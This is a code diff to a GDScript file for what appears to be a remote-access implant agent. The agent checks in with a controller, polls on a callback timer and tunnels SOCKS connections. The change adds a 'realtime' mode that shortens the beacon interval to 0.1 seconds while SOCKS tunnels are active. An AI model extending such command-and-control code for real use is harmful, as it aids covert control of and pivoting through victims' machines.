@@ -10,15 +10,16 @@ signal tasking
 var config = null
 var _sent_checkin_already = false
 var socks_connection = {}
+var _go_realtime = false
 
 # Called when the node enters the scene tree for the first time.
 func _ready():
 	config = $".".get_parent().get_node("config")
 	protocol = config.get_transport($".", $".".get_parent().get_parent().get_node("Agent"))
+	add_child(protocol)
 
 func _send_checkin():
 	if _sent_checkin_already:
-		print("friggin chill for dat uuid brah...")
 		return
 	
 	if protocol != null:
@@ -104,7 +105,13 @@ func _on_callback_timer_timeout():
 		protocol.client_connect()
 
 	# leave here - in the event that a request to change it came in...
-	$CallbackTimer.wait_time = config.get_callback_wait_time()
+	if _go_realtime:
+		$CallbackTimer.wait_time = 0.1
+	else:
+		$CallbackTimer.wait_time = config.get_callback_wait_time()
+
+func set_realtime(value:bool):
+	_go_realtime = value
 
 func send(payload):
 	protocol.send(payload)
@@ -197,3 +204,7 @@ func handle_socks(parameters):
 		if data != null and not do_exit:
 			socks_connection[server_id] = TransportSocks.new(self, server_id, data)
 			add_child(socks_connection[server_id]) # s.t. the _process is called every frame?
+			set_realtime(true)
+
+	if socks_connection.size() <= 0:
+		set_realtime(false)
